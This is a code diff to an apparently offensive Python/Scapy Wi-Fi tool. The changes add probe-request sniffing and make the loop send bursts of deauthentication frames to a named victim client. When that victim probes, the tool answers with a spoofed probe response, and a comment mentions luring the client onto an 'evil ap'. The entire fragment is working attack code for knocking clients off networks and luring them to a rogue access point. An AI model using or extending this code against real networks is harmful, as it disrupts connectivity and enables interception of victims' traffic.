@@ -30,6 +30,13 @@ def set_injector_adapter(interface_name, channel):
             print(f"[!] Changing {interface_name} to monitor mode failed with the error: {e}")
             sys.exit(1)
 
+def wait_for_probe_timeout(interface_name):
+    packets = sniff(iface=interface_name, filter="wlan type mgt subtype probe-req",count=1, store=1,timeout=1)
+    if packets:
+        return packets[0]
+    return None
+    
+
 def send_disas_packets(interface_name, victim, ap, stop_injection):
     victim_addr = victim['bssid']
     bssid = ap['bssid']
@@ -62,9 +69,13 @@ def send_disas_packets(interface_name, victim, ap, stop_injection):
     while not stop_injection.is_set():
         try:
             #sendp(dis_packet, iface=interface_name, count=10,inter=0.1, verbose=False)
-            sendp(deauth_packet, iface=interface_name, verbose=False)
+            sendp(deauth_packet, iface=interface_name,count=5,inter=0.1, verbose=False)
         # add option for injection thread to end when client already connected to evil ap
             time.sleep(5)
+            probe_req = wait_for_probe_timeout(interface_name)
+            if probe_req is None or probe_req[Dot11].addr2 != victim_addr:
+                continue
+            print("[+] Victim sent probe request!")
             sendp(probe_response, iface=interface_name, verbose=False)
 
         except Exception as e:
